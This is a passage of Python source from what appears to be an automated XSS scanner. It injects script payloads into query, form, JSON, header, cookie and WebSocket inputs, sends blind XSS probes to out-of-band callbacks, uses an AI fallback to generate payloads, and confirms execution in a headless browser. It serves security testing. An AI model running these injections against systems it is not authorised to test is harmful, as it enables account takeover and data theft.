        # Parameters discovered from HTML/forms/links/JS take precedence; the fuzz
        # list is used only as a fallback.
        if (
            getattr(self.args, "fuzz_params", False)
            and not looks_like_dangerous(url)
            and endpoint_accepts_query_params(url, resp_text)
        ):
            limit = max(1, int(getattr(self.args, "fuzz_param_limit", 10)))
            fallback_candidates = [
                name for name in FUZZ_PARAM_NAMES if name not in discovered_names
            ]
            for name in fallback_candidates[:limit]:
                add(
                    InjectionPoint(
                        url=url,
                        method="GET",
                        param=name,
                        value="",
                        source="query",
                        param_source="fuzzed",
                        page_url=url,
                    )
                )

        return points

    def _api_points(self, url: str) -> List[InjectionPoint]:
        """Build body injection points from discovered OpenAPI operations."""
        points: List[InjectionPoint] = []
        if not self.api_operations:
            return points
        target_path = urlsplit(url).path.rstrip("/") or "/"
        for operation in self.api_operations:
            operation_path = urlsplit(operation.url).path.rstrip("/") or "/"
            if operation_path != target_path:
                continue
            content_type = str(getattr(operation, "content_type", "") or "").lower()
            for parameter in getattr(operation, "parameters", []):
                if parameter.location not in ("body", "formData"):
                    continue
                sample = dict(getattr(operation, "sample_body", {}) or {})
                value = str(sample.get(parameter.name, parameter.example))
                method = str(getattr(operation, "method", "POST") or "POST").upper()
                if "json" in content_type:
                    points.append(
                        InjectionPoint(
                            url=operation.url,
                            method=method,
                            param=parameter.name,
                            value=value,
                            source="json",
                            json_body=sample or {parameter.name: value},
                            content_type=operation.content_type or "application/json",
                            page_url=url,
                        )
                    )
                else:
                    fields = {
                        name: FormField(name=name, value=str(item))
                        for name, item in sample.items()
                    } or {
                        parameter.name: FormField(name=parameter.name, value=value)
                    }
                    points.append(
                        InjectionPoint(
                            url=operation.url,
                            method=method,
                            param=parameter.name,
                            value=value,
                            source="form",
                            fields=fields,
                            content_type=operation.content_type,
                            page_url=url,
                        )
                    )
        return points

    # -- injection --------------------------------------------------------------------
    def build_get_url(self, point: InjectionPoint, payload: str) -> str:
        if point.source == "path":
            return render_path_payload(point.url, payload)
        if point.source == "fragment":
            base = point.url.split("#", 1)[0]
            return f"{base}#{payload}"
        if point.source == "query":
            return replace_query_param(point.url, point.param, payload)
        values = {name: spec.value for name, spec in point.fields.items()}
        values[point.param] = payload
        return merge_query(point.url, values)

    def poc_for_point(self, point: InjectionPoint, payload: str) -> Tuple[str, str]:
        """Reproduction proof for this point (module-level :func:`build_poc`)."""
        return build_poc(point, payload)

    @staticmethod
    def evidence_from_response(
        response: Optional[HttpResponse], token: str, parameter: str = ""
    ) -> Dict[str, Any]:
        """Evidence fields shared by every HTTP-backed finding."""
        if response is None:
            return {}
        request: Dict[str, Any] = {}
        request_builder = getattr(response, "request_dict", None)
        if callable(request_builder):
            request = request_builder(parameter)
        else:
            # Test doubles and third-party response objects may not implement
            # request_dict(); keep the evidence useful without inventing headers.
            url = str(
                getattr(response, "request_url", "")
                or getattr(response, "url", "")
                or ""
            )
            if url:
                request = request_to_dict(
                    str(getattr(response, "request_method", "GET") or "GET"),
                    url,
                    headers=dict(getattr(response, "request_headers", {}) or {}),
                    body=str(getattr(response, "request_body", "") or ""),
                    injected_parameter=parameter,
                )
        return {
            "request": request,
            "response_status": int(getattr(response, "status", 0) or 0),
            "response_excerpt": response_excerpt(
                str(getattr(response, "text", "") or ""), token
            ),
        }

    def _browser_state(self) -> Tuple[bool, bool]:
        """Return ``(requested, available)`` for confidence rationales."""
        requested = not bool(getattr(self.args, "no_browser", False)) and (
            getattr(self.args, "confirm", "auto") != "http"
        )
        available = bool(self.pool is not None and self.pool.engines)
        return requested, available

    def build_post_data(self, point: InjectionPoint, payload: str) -> Dict[str, str]:
        values = {name: spec.value for name, spec in point.fields.items()}
        values[point.param] = payload
        return values

    async def send_point(self, point: InjectionPoint, payload: str) -> Optional[HttpResponse]:
        method = point.method.upper()
        if point.source == "json":
            body = copy.deepcopy(point.json_body or {})
            json_path = point.extra.get("json_path")
            if isinstance(json_path, list) and json_path:
                target: Any = body
                for segment in json_path[:-1]:
                    target = target[int(segment)] if isinstance(target, list) else target[segment]
                final = json_path[-1]
                if isinstance(target, list):
                    target[int(final)] = payload
                else:
                    target[final] = payload
            else:
                body[point.param] = payload
            return await self.http.request(
                method,
                point.url,
                json_body=body,
                headers={"Content-Type": point.content_type or "application/json"},
            )
        if method == "GET":
            return await self.http.get(self.build_get_url(point, payload))
        return await self.http.request(
            method, point.url, data=self.build_post_data(point, payload)
        )

    async def inject_blind(self, point: InjectionPoint) -> None:
        """Send out-of-band payloads to a point, independent of reflection."""
        if (
            (not self.blind_url and self.oob is None)
            or not HAS_ADVANCED
            or build_blind_payloads is None
        ):
            return
        key = point.key()
        if key in self._blind_points:
            return
        self._blind_points.add(key)

        marker = unique_token("b", 10)
        callback = self.blind_url or ""
        registration = None
        if self.oob is not None:
            override = ""
            if self.blind_url:
                separator = "&" if "?" in self.blind_url else "?"
                override = f"{self.blind_url}{separator}m={marker}"
            try:
                registration = self.oob.allocate(
                    marker,
                    point.url,
                    point.param,
                    point.method,
                    callback=override or None,
                )
            except Exception as exc:
                self.console.debug(f"OOB allocation failed: {exc}")
            if registration is not None:
                callback = self.blind_url or registration.callback
                self.stats.oob_registered = len(self.oob.registrations)
                self.state.extra["oob_registered"] = self.stats.oob_registered
        if not callback:
            return

        payloads = build_blind_payloads(callback, marker, "html")
        sent: List[str] = []
        # Script and attribute-breakout variants cover stored HTML and echo
        # contexts with two requests per injection point.
        for item in payloads[:2]:
            payload = self.transform_payload(item.template)
            result = await self.send_point(point, payload)
            self.stats.payloads += 1
            if result is not None and not result.error:
                sent.append(payload)

        if not sent:
            return

        if registration is not None:
            registration.payload = sent[0]

        self.blind_markers.append(
            {
                "marker": marker,
                "url": point.url,
                "parameter": point.param,
                "method": point.method.upper(),
                "callback": callback,
            }
        )
        # Policy: a blind probe is a *probe*, not a finding.  It only becomes a
        # report entry (Blind XSS - callback confirmed) when the out-of-band
        # endpoint actually answers with this marker - a payload being merely
        # "sent" proves nothing about execution or storage.
        self.console.info(
            f"Blind XSS probe deployed: marker {marker} -> {callback} "
            "(finding is raised only if a callback is observed)",
            important=False,
        )

    async def test_point(self, point: InjectionPoint) -> None:
        self.stats.points += 1
        location = f"{point.method} {point.param} @ {truncate(point.url, 110)}"

        # Out-of-band injection does not need a reflection: the payload may be
        # stored and executed later by an admin/back-office view.
        await self.inject_blind(point)

        token = unique_token()
        
        # Use per-character probing if enabled
        if HAS_ADVANCED and getattr(self.args, 'per_char_probe', False):
            from xoxss.analysis.per_char import PerCharProbe, ProbeContext
            probe_engine = PerCharProbe()
            probe = probe_engine.generate_probe_string(token)
            response = await self.send_point(point, probe)
            if response is None or response.error or not response.text:
                reason = (
                    response.error
                    if response is not None and response.error
                    else "empty response body"
                )
                self.console.debug(f"Rejected candidate (no analyzable response: {reason}): {location}")
                return
            
            # Analyze with per-character probe
            probe_analysis = probe_engine.analyze_probe(response.text, token)
            info = analyze_reflection(
                response.text, token, probe, response.header("content-type", "")
            )
            # Use context from per-char analysis if available
            if probe_analysis.detected_context != ProbeContext.UNKNOWN:
                info.context = probe_analysis.detected_context.value
        else:
            probe = self.payloads.probe(token)
            response = await self.send_point(point, probe)
            if response is None or response.error or not response.text:
                reason = (
                    response.error
                    if response is not None and response.error
                    else "empty response body"
                )
                self.console.debug(f"Rejected candidate (no analyzable response: {reason}): {location}")
                return

            info = analyze_reflection(
                response.text, token, probe, response.header("content-type", "")
            )
        
        if not info.reflected:
            # Gate (a): Reflection check failed on initial probe - drop silently
            self.console.debug(f"Rejected candidate (marker not reflected): {location}")
            self.stats.false_positives += 1
            self.stats.rejections["marker not reflected in response body or live DOM"] = (
                self.stats.rejections.get("marker not reflected in response body or live DOM", 0) + 1
            )
            return

        # Deduplication Gate: Deduplicate by (endpoint, injection point, context)
        # so the same context is reported once.
        canonical_ep = canonical_finding_url(point.url, point.source)
        dedup_key = (canonical_ep, point.param, info.context)
        if dedup_key in self._confirmed_contexts:
            self.console.debug(
                f"Context {info.context} already confirmed on {canonical_ep} ({point.param}); skipping"
            )
            return

        # Optional special-character matrix: one extra probe maps which
        # delimiters survive at this point.  The result is attached to every
        # finding and fed to the AI fallback prompt.
        if getattr(self.args, "char_matrix", False):
            matrix_token = unique_token("m", 8)
            matrix_probe = build_matrix_probe(matrix_token)
            matrix_response = await self.send_point(point, matrix_probe)
            if (
                matrix_response is not None
                and not matrix_response.error
                and matrix_response.text
            ):
                self.stats.payloads += 1
                matrix = analyze_character_matrix(matrix_response.text, matrix_token)
                point.extra["char_matrix"] = matrix
                groups = format_matrix_summary(matrix)
                summary = "; ".join(
                    f"{status}={''.join(chars)}"
                    for status, chars in groups.items()
                    if chars
                )
                self.console.debug(f"Character matrix {location}: {summary}")

        if getattr(self.args, "mutation_probes", False):
            await self._probe_mutations(point)

        self.console.debug(f"Reflected ({info.detail}): {location}")

        # Use polyglot payloads if enabled (skipped in AI-only mode).
        if HAS_ADVANCED and getattr(self.args, 'polyglot', False) and not self._ai_only:
            from xoxss.analysis.polyglot import (
                PolyglotContext,
                PolyglotGenerator as PolyglotPayloadGenerator,
            )
            polyglot_gen = PolyglotPayloadGenerator()
            target_context = next(
                (context for context in PolyglotContext if context.value == info.context),
                PolyglotContext.HTML,
            )
            polyglots = polyglot_gen.generate_polyglots(
                token, [target_context], self.args.max_payloads
            )
            for polyglot in polyglots:
                if self._stop.is_set():
                    return
                payload = self.transform_payload(polyglot.payload)
                result = await self.send_point(point, payload)
                if result is None or result.error or not result.text:
                    continue
                self.stats.payloads += 1
                polyglot_info = analyze_reflection(
                    result.text, token, payload, result.header("content-type", "")
                )
                # Confirm execution with the browser when one is available
                if self.pool is not None and self.pool.engines and self.args.confirm != "http":
                    finding = await self.confirm_in_browser(
                        point, payload, token, polyglot_info,
                        result.header("content-type", ""),
                        response=result,
                    )
                    if finding:
                        if dedup_key not in self._confirmed_contexts:
                            self._confirmed_contexts.add(dedup_key)
                            self.add_finding(finding)
                        return
                # If execution not confirmed in browser, continue testing candidates
                continue
            if polyglots:
                return
            # No polyglots for this context: fall through to the standard loop
            # so the injection point is never left untested.

        # Standard payload testing
        templates = (
            []
            if self._ai_only
            else self.payloads.payloads_for(info.context, self.args.max_payloads)
        )
        if getattr(self.args, "adaptive_payloads", False):
            probe_templates = list(templates)
            base_key = self._mutation_key(point.url)
            observations = self._mutation_observations.get(base_key, [])
            if observations:
                probe_templates.extend(
                    apply_observed_normalization(template, observations)
                    for template in templates
                )
            variants = assemble_variants(
                probe_templates,
                info.raw_specials,
                limit=max(1, self.args.max_payloads * 2),
            )
            templates = list(dict.fromkeys([*templates, *variants]))
        for template in templates:
            if self._stop.is_set():
                return
            payload_token = unique_token()
            payload = self.transform_payload(
                self.payloads.render(template, payload_token, info.context)
            )
            result = await self.send_point(point, payload)
            if result is None or result.error or not result.text:
                continue
            self.stats.payloads += 1
            payload_info = analyze_reflection(
                result.text, payload_token, payload, result.header("content-type", "")
            )
            normalized_payload = reverse_normalization(
                payload, self._mutation_observations.get(self._mutation_key(point.url), [])
            )
            normalization_confirmed = normalized_payload != payload and normalized_payload in result.text
            if normalization_confirmed:
                payload_info = analyze_reflection(
                    result.text, payload_token, normalized_payload,
                    result.header("content-type", ""),
                )
            if not payload_info.reflected:
                continue

            if point.method.upper() == "POST" and self.args.stored and point.key() not in self._stored_checked:
                self._stored_checked.add(point.key())
                stored_page = await self.check_stored(point, payload_token, payload)
                if stored_page:
                    _, stored_poc_command = self.poc_for_point(point, payload)
                    stored_response = getattr(self, "_stored_hit_response", None)
                    evidence_fields = self.evidence_from_response(
                        result, payload_token, point.param
                    )
                    if stored_response is not None:
                        evidence_fields["response_status"] = int(stored_response.status or 0)
                        evidence_fields["response_excerpt"] = response_excerpt(
                            stored_response.text, payload_token
                        )
                    self.add_finding(
                        Finding(
                            kind="Stored XSS (payload persisted)",
                            url=stored_page,
                            parameter=point.param,
                            method="POST",
                            payload=payload,
                            evidence=f"payload persisted and re-rendered on {stored_page}",
                            confidence="high",
                            confidence_rationale=(
                                "Persistence was verified over HTTP; browser execution of the "
                                "stored payload was not re-confirmed."
                            ),
                            context=payload_info.context,
                            detail="Persistence verified over HTTP; execution not re-confirmed",
                            poc_url=stored_page,
                            poc_command=stored_poc_command,
                            poc_html=build_form_html_poc(point, payload),
                            char_matrix=dict(point.extra.get("char_matrix") or {}),
                            source="stored",
                            **evidence_fields,
                        )
                    )
                    return

            content_type = result.header("content-type", "")
            if not payload_info.executable and not self.args.report_reflections:
                reason = payload_info.inert_reason or (
                    f"context={payload_info.context} has no surviving breakout delimiter"
                )
                self.console.debug(
                    f"Rejected candidate ({reason}): {location}; "
                    f"raw={''.join(payload_info.raw_specials) or 'none'} "
                    f"encoded={''.join(payload_info.encoded_specials) or 'none'}"
                )
                continue

            if self.pool is not None and self.pool.engines and self.args.confirm != "http":
                finding = await self.confirm_in_browser(
                    point, payload, payload_token, payload_info,
                    content_type,
                    response=result,
                )
                if finding:
                    if dedup_key not in self._confirmed_contexts:
                        self._confirmed_contexts.add(dedup_key)
                        self.add_finding(finding)
                    return
                self.console.debug(
                    f"Browser attempted but did not confirm execution: {location}"
                )
            # Unconfirmed candidate: do not mark confirmed, continue trying remaining templates
            continue

        # -- AI fallback ---------------------------------------------------------
        # Reached only when the deterministic corpus produced no finding.  AI
        # output is a candidate: it must still reflect with surviving delimiters
        # and, when a browser is available, execute in the instrumented sink.
        if self.ai is None or not self.ai.available():
            return
        ai_payloads = await self.ai.generate_payloads(
            endpoint=point.url,
            param_name=point.param,
            location=point.method.upper(),
            context=info.context,
            char_matrix=point.extra.get("char_matrix") or {},
            snippet=info.snippet,
            reflected_token=token,
            limit=max(1, min(8, int(getattr(self.args, "max_payloads", 20) or 20))),
        )
        if not ai_payloads:
            return
        self.console.info(
            f"AI fallback produced {len(ai_payloads)} candidate(s) for {location}",
            important=False,
        )
        for candidate in ai_payloads:
            if self._stop.is_set():
                return
            ai_token = unique_token("a", 9)
            marked = mark_ai_payload(candidate, ai_token)
            result = await self.send_point(point, marked)
            if result is None or result.error or not result.text:
                continue
            self.stats.payloads += 1
            ai_info = analyze_reflection(
                result.text, ai_token, marked, result.header("content-type", "")
            )
            if not ai_info.reflected or not ai_info.executable:
                self.console.debug(
                    f"Rejected AI candidate "
                    f"({ai_info.inert_reason or ai_info.context}): {location}"
                )
                continue
            content_type = result.header("content-type", "")
            if (
                self.pool is not None
                and self.pool.engines
                and self.args.confirm != "http"
            ):
                finding = await self.confirm_in_browser(
                    point, marked, ai_token, ai_info, content_type, response=result
                )
                if finding:
                    if dedup_key not in self._confirmed_contexts:
                        self._confirmed_contexts.add(dedup_key)
                        finding.kind = "Reflected XSS (AI-assisted)"
                        finding.detail = (
                            "AI candidate; "
                            + (finding.detail or "execution confirmed in browser")
                        )
                        self.add_finding(finding)
                    return
                self.console.debug(
                    f"AI candidate did not confirm in browser: {location}"
                )
                continue

        # Gate: Only report unconfirmed reflections if operator explicitly requested --report-reflections
        if getattr(self.args, "report_reflections", False) and info.reflected and info.executable:
            requested, available = self._browser_state()
            confidence, rationale, detail = reflection_confidence(
                info,
                requested=requested,
                available=available,
                content_type=response.header("content-type", "") if response else "",
            )
            poc_url, poc_command = self.poc_for_point(point, probe)
            self.add_finding(
                Finding(
                    kind="Reflected XSS (unconfirmed reflection)",
                    url=point.url,
                    parameter=point.param,
                    method=point.method.upper(),
                    payload=probe,
                    evidence=f"marker reflected but execution not confirmed ({info.detail})",
                    confidence="medium" if confidence == "confirmed" else confidence,
                    confidence_rationale=(
                        "Informational: unconfirmed reflection reported per --report-reflections; " + rationale
                    ),
                    context=info.context,
                    detail=detail,
                    poc_url=poc_url,
                    poc_command=poc_command,
                    source=point.source,
                    param_source=getattr(point, "param_source", "discovered"),
                )
            )

    @staticmethod
    def _mutation_key(url: str) -> str:
        parts = urlsplit(url)
        return urlunsplit((parts.scheme, parts.netloc, parts.path or "/", "", ""))

    async def _probe_mutations(self, point: InjectionPoint) -> None:
        """Record observed transformations without labeling them XSS by themselves."""
        key = self._mutation_key(point.url)
        if key in self._mutation_probed:
            return
        self._mutation_probed.add(key)
        marker = unique_token("m", 10)
        observations: List[MutationObservation] = []
        for probe in build_probes(
            marker, int(getattr(self.args, "mutation_probe_limit", 12) or 12)
        ):
            if self._stop.is_set():
                break
            try:
                response = await self.send_point(point, probe.sent)
            except Exception as exc:
                self.console.debug(
                    f"Mutation probe {probe.name} failed for {truncate(point.url, 100)}: "
                    f"{str(exc)[:160]}"
                )
                continue
            self.stats.payloads += 1
            if response is None or response.error or not response.text:
                continue
            observation = observe(response.text, probe)
            if observation is not None:
                observations.append(observation)
                self.mutation_findings.append(
                    {
                        "url": point.url,
                        "parameter": point.param,
                        "name": observation.name,
                        "kind": observation.kind,
                        "sent": observation.sent,
                        "transformed": observation.transformed,
                        "evidence": observation.evidence,
                    }
                )
                self.console.warn(
                    f"Input transformation observed ({observation.name}) at "
                    f"{truncate(point.url, 100)}; this is a signal, not an XSS finding"
                )
        if observations:
            self._mutation_observations[key] = observations
            self.state.extra["transform_observations"] = self.mutation_findings[:1000]

    def _record_validation_rejection(self, val: ValidationResult) -> None:
        """Record rejection reasons and false positive classifications for stats."""
        if val.classification == FALSE_POSITIVE:
            self.stats.false_positives += 1
        elif val.classification == NEEDS_MANUAL_TEST:
            self.stats.needs_manual_test += 1
        if val.reason:
            self.stats.rejections[val.reason] = self.stats.rejections.get(val.reason, 0) + 1

    async def validate_execution(
        self,
        point: InjectionPoint,
        payload: str,
        token: str,
        response_text: str = "",
        content_type: str = "",
    ) -> ValidationResult:
        """Execution-based validation gate before confirming any finding.

        A finding is only marked CONFIRMED when BOTH conditions are met:
          (a) REFLECTION: The unique per-payload marker string is present in the HTTP
              response body or in the live DOM. Never rely on confidence scores.
          (b) EXECUTION: A headless browser (Playwright / Chromium) loads the URL with
              the payload and observes execution:
                - Hook window.alert/confirm/prompt before page JS runs,
                - Listen for the Playwright 'dialog' event,
                - Reject if observed dialog text does NOT contain our marker.

        Waits for 'load' plus an extra ~3s to catch deferred/DOM-based sinks.
        Returns one of: CONFIRMED_EXECUTION, REJECTED, or UNVERIFIED (navigation error).
        """
        if self.pool is None or not self.pool.engines:
            return ValidationResult(
                status=UNVERIFIED,
                classification=NEEDS_MANUAL_TEST,
                reason="browser verification unavailable (no active browser workers)",
            )
        try:
            async with self.pool.borrow() as browser:
                self.stats.browser_checks += 1
                target_url = (
                    self.build_get_url(point, payload)
                    if point.method.upper() == "GET"
                    else (point.page_url or point.url)
                )

                # Navigation (waiting for page load)
                nav_err = ""
                try:
                    if point.method.upper() == "GET":
                        nav_err = await browser.navigate(target_url)
                    else:
                        await browser.navigate(point.page_url or point.url)
                        submitted = await browser.submit_form(
                            point.form_index if point.form_index is not None else 0,
                            point.param,
                            payload,
                        )
                        self.console.debug(f"Form submit result: {submitted}")
                except asyncio.CancelledError:
                    raise
                except Exception as exc:
                    return ValidationResult(
                        status=UNVERIFIED,
                        classification=NEEDS_MANUAL_TEST,
                        reason=f"navigation error: {exc}",
                    )

                if nav_err and ("crash" in nav_err.lower() or "closed" in nav_err.lower() or "net::" in nav_err.lower()):
                    return ValidationResult(
                        status=UNVERIFIED,
                        classification=NEEDS_MANUAL_TEST,
                        reason=f"navigation error: {nav_err}",
                    )

                # Wait for 'load' plus an extra ~3s to catch deferred/DOM-based sinks
                deadline = time.monotonic() + 3.0
                hit = None
                browser_data: Dict[str, Any] = {}
                matching_dialog: Optional[str] = None
                foreign_dialogs: List[str] = []

                while True:
                    browser_data = await browser.collect()
                    raw_dialogs = [
                        str(d) for d in (browser_data.get("dialogs", []) + browser_data.get("alerts", []))
                        if d is not None
                    ]
                    for d in raw_dialogs:
                        if token in d:
                            matching_dialog = d
                            break
                        elif d not in foreign_dialogs:
                            foreign_dialogs.append(d)

                    hit = BrowserEngine._match(browser_data, token)
                    if (hit and hit.get("executed") == "yes") or matching_dialog:
                        break
                    if time.monotonic() >= deadline:
                        break
                    await asyncio.sleep(0.25)

                live_dom = str(browser_data.get("html") or "")
                in_response = bool(response_text and token in response_text)
                in_dom = bool(live_dom and token in live_dom)
                reflected = in_response or in_dom

                # Gate (a): REFLECTION check
                if not reflected:
                    return ValidationResult(
                        status=REJECTED,
                        classification=FALSE_POSITIVE,
                        reason="marker string not present in response body or live DOM",
                        in_dom=in_dom,
                        in_response=in_response,
                    )

                # Gate (b): EXECUTION check
                # Reject if foreign dialog observed and none contained our marker
                if foreign_dialogs and not matching_dialog and not (hit and hit.get("executed") == "yes"):
                    return ValidationResult(
                        status=REJECTED,
                        classification=FALSE_POSITIVE,
                        reason="observed dialog text does NOT contain our marker (coincidental page dialog)",
                        dialog_text=foreign_dialogs[0],
                        in_dom=in_dom,
                        in_response=in_response,
                    )

                execution_observed = bool(matching_dialog) or bool(hit and hit.get("executed") == "yes")
                if not execution_observed:
                    return ValidationResult(
                        status=REJECTED,
                        classification=FALSE_POSITIVE,
                        reason="execution was not observed in browser within 3s",
                        in_dom=in_dom,
                        in_response=in_response,
                    )

                # Both gates satisfied: CONFIRMED_EXECUTION
                target_path = self.screenshot_dir / f"{token}.png"
                screenshot = await browser.screenshot(str(target_path))
                evidence = hit.get("evidence", "") if hit else f"dialog: {matching_dialog}"
                sink = str(hit.get("sink") or "") if hit else ""
                dom_path = str(hit.get("dom_path") or "") if hit else ""
                if sink:
                    evidence = f"sink={sink}" + (f" at {dom_path}" if dom_path else "") + (f"; {evidence}" if evidence else "")
                return ValidationResult(
                    status=CONFIRMED_EXECUTION,
                    classification=None,
                    reason="execution and reflection verified in browser",
                    evidence=evidence,
                    dialog_text=matching_dialog,
                    in_dom=in_dom,
                    in_response=in_response,
                    screenshot=screenshot,
                )
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            return ValidationResult(
                status=UNVERIFIED,
                classification=NEEDS_MANUAL_TEST,
                reason=f"browser validation error: {exc}",
            )

    async def confirm_in_browser(
        self,
        point: InjectionPoint,
        payload: str,
        token: str,
        info: ReflectionInfo,
        content_type: str = "",
        response: Optional[HttpResponse] = None,
    ) -> Optional[Finding]:
        if not browser_prequalified(info, content_type):
            return None
        res_text = response.text if response else ""
        val = await self.validate_execution(point, payload, token, response_text=res_text, content_type=content_type)
        if val.status != CONFIRMED_EXECUTION:
            self._record_validation_rejection(val)
            return None

        poc_url, poc_command = self.poc_for_point(point, payload)
        evidence = val.evidence or f"dialog({val.dialog_text or token})"
        detail = "JavaScript execution confirmed in browser"
        return Finding(
            kind="Reflected XSS",
            url=self.build_get_url(point, payload) if point.method.upper() == "GET" else point.url,
            parameter=point.param,
            method=point.method.upper(),
            payload=payload,
            evidence=evidence,
            confidence="confirmed",
            confidence_rationale=(
                "Execution confirmed in headless browser: dialog/sink hit observed with unique marker."
            ),
            context=info.context,
            detail=detail,
            screenshot=val.screenshot,
            poc_url=poc_url,
            poc_command=poc_command,
            poc_html=build_form_html_poc(point, payload),
            char_matrix=dict(point.extra.get("char_matrix") or {}),
            source=point.source,
            param_source=getattr(point, "param_source", "discovered"),
            **self.evidence_from_response(response, token, point.param),
        )

    def add_finding(self, finding: Finding) -> bool:
        if not enforce_finding_policy(finding):
            self.console.debug(
                f"Dropped malformed finding: kind={finding.kind!r} url={finding.url!r}"
            )
            return False
        key = finding.key()
        if key in self._finding_keys:
            return False
        self._finding_keys.add(key)
        self.findings.append(finding)
        self.stats.findings = len(self.findings)
        self.state.add_finding(finding)
        self.state.save(force=True)
        self.console.event("finding", target=self.target, finding=finding.to_dict())
        self.console.finding(finding)
        return True

    # -- header injection -------------------------------------------------------------
    async def test_headers(self, url: str) -> None:
        excluded = {
            str(name).strip().lower()
            for name in (getattr(self.args, "exclude_header", None) or [])
            if str(name).strip()
        }
        candidates = getattr(self.args, "header_list", None) or [
            "User-Agent",
            "Referer",
            "X-Forwarded-Host",
            "X-Forwarded-For",
            "X-Forwarded-Server",
            "X-Real-IP",
            "X-Client-IP",
            "True-Client-IP",
            "CF-Connecting-IP",
            "Forwarded",
            "X-Original-URL",
            "X-Rewrite-URL",
            "X-Forwarded-Uri",
            "X-Request-URI",
            "X-Original-URI",
            "Origin",
        ]
        headers = [
            header
            for header in dict.fromkeys(candidates)
            if header.lower() not in excluded and header.lower() != "cookie"
        ]
        for offset in range(0, len(headers), 10):
            if self._stop.is_set():
                return
            group = headers[offset:offset + 10]
            # Identify reflective headers with one harmless, unique marker per
            # candidate. Only headers whose marker comes back need the more
            # expensive executable-payload request.
            markers = {header: unique_token() for header in group}
            probe_headers: Dict[str, str] = {}
            for header, marker in markers.items():
                normalized = header.lower()
                if normalized == "origin":
                    value = f"https://{marker}.xoxss.invalid"
                elif normalized == "referer":
                    value = f"https://xoxss.invalid/{marker}"
                elif normalized in ("host", "x-forwarded-host"):
                    value = f"{marker}.xoxss.invalid"
                else:
                    value = marker
                probe_headers[header] = value
            try:
                response = await self.http.get(url, headers=probe_headers)
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                self.console.debug(f"Header reflection probe failed for {truncate(url, 120)}: {exc}")
                continue
            if response.error or not response.text:
                continue
            reflected_headers = [
                header for header, marker in markers.items() if marker in response.text
            ]
            self.console.debug(
                f"Header marker probe: {len(reflected_headers)}/{len(markers)} candidate header(s) reflected"
            )
            for header in reflected_headers:
                if self._stop.is_set():
                    return
                token = unique_token()
                payload = self.transform_payload(
                    self.payloads.render("<script>{m}</script>", token)
                )
                try:
                    response = await self.http.get(url, headers={header: payload})
                except asyncio.CancelledError:
                    raise
                except Exception as exc:
                    self.console.debug(f"Header validation failed for {header}: {exc}")
                    continue
                if response.error or not response.text:
                    continue
                info = analyze_reflection(
                    response.text, token, payload, response.header("content-type", "")
                )
                if not info.reflected or not info.executable:
                    if info.reflected and not info.executable:
                        self.console.debug(
                            f"Header {header} reflected but not executable; suppression: "
                            "no finding without executable context"
                        )
                    continue
                poc_url, poc_command = self.poc_for_point(
                    InjectionPoint(url=url, method="GET", param=header, source="header"), payload
                )
                self.add_finding(
                    Finding(
                        kind="Header XSS (reflection)",
                        url=url,
                        parameter=header,
                        method="GET",
                        payload=payload,
                        evidence=f"injected header reflected unescaped and executable ({info.detail})",
                        confidence="medium",
                        context=info.context,
                        detail="Header reflections cannot be browser-verified without a proxy",
                        poc_url=poc_url,
                        poc_command=poc_command,
                        source="header",
                        **self.evidence_from_response(response, token, header),
                    )
                )

        await self._test_cookie_header(url, excluded)

    async def _test_cookie_header(self, url: str, excluded: Optional[Set[str]] = None) -> None:
        """Inject into existing session cookies through the ``Cookie`` header.

        The whole cookie jar is preserved and only one value is replaced, so the
        proof runs against the same authenticated session instead of a stripped
        request.
        """
        excluded = excluded or set()
        if "cookie" in excluded:
            return
        jar = dict(getattr(self, "_cookies", {}) or {})
        if not jar:
            return
        limit = max(1, int(getattr(self.args, "cookie_test_limit", 10) or 10))
        for name in list(jar)[:limit]:
            if self._stop.is_set():
                return
            marker = unique_token("c", 9)
            probe_jar = dict(jar)
            probe_jar[name] = marker
            cookie_header = "; ".join(f"{key}={value}" for key, value in probe_jar.items())
            try:
                response = await self.http.get(url, headers={"Cookie": cookie_header})
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                self.console.debug(f"Cookie reflection probe failed for {name}: {exc}")
                continue
            if response.error or not response.text or marker not in response.text:
                continue

            token = unique_token()
            payload = self.transform_payload(
                self.payloads.render("<script>{m}</script>", token)
            )
            probe_jar[name] = payload
            cookie_header = "; ".join(f"{key}={value}" for key, value in probe_jar.items())
            try:
                response = await self.http.get(url, headers={"Cookie": cookie_header})
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                self.console.debug(f"Cookie validation failed for {name}: {exc}")
                continue
            if response.error or not response.text:
                continue
            info = analyze_reflection(
                response.text, token, payload, response.header("content-type", "")
            )
            if not info.reflected or not info.executable:
                continue
            point = InjectionPoint(url=url, method="GET", param=name, source="cookie")
            poc_url, poc_command = self.poc_for_point(point, payload)
            self.add_finding(
                Finding(
                    kind="Cookie XSS (reflection)",
                    url=url,
                    parameter=name,
                    method="GET",
                    payload=payload,
                    evidence=(
                        "injected cookie reflected unescaped and executable "
                        f"({info.detail})"
                    ),
                    confidence="medium",
                    context=info.context,
                    detail="Cookie reflections cannot be browser-verified without a proxy",
                    poc_url=poc_url,
                    poc_command=poc_command,
                    source="cookie",
                    **self.evidence_from_response(response, token, name),
                )
            )

    # -- DOM XSS ----------------------------------------------------------------------
    async def _probe_websocket_frames(self, page_url: str, scripts: Sequence[DomScript]) -> None:
        """Actively inject marker frames into WebSocket endpoints found in page JS."""
        from xoxss.analysis.websocket import (
            WebSocketActiveProbe,
            extract_websocket_urls,
            websocket_http_equivalent,
        )

        js_text = "\n".join(script.content for script in scripts if script.content)
        endpoints = extract_websocket_urls(js_text, page_url)
        if not endpoints:
            return
        parts = urlsplit(page_url)
        origin = urlunsplit((parts.scheme, parts.netloc, "", "", ""))
        headers = self._parse_headers(self.args.headers)
        cookies = self._parse_cookies(getattr(self.args, "cookies", None), getattr(self.args, "cookie_file", None))
        probe = WebSocketActiveProbe(
            self.console,
            timeout=min(10.0, max(3.0, float(self.args.timeout))),
            headers=headers,
            cookies=cookies,
            origin=origin,
            insecure=bool(getattr(self.args, "insecure", False)),
            proxy=getattr(self.args, "proxy", None),
        )
        checked = 0
        for endpoint in endpoints:
            if checked >= 3 or self._stop.is_set():
                break
            if not self.scope.in_scope(websocket_http_equivalent(endpoint)):
                self.console.debug(f"Skipping out-of-scope WebSocket endpoint: {truncate(endpoint, 120)}")
                continue
            checked += 1
            marker = unique_token(prefix="ws")
            hits = await probe.probe(endpoint, markers=[marker])
            for hit in hits:
                if not hit.reflected:
                    if hit.error:
                        self.console.debug(
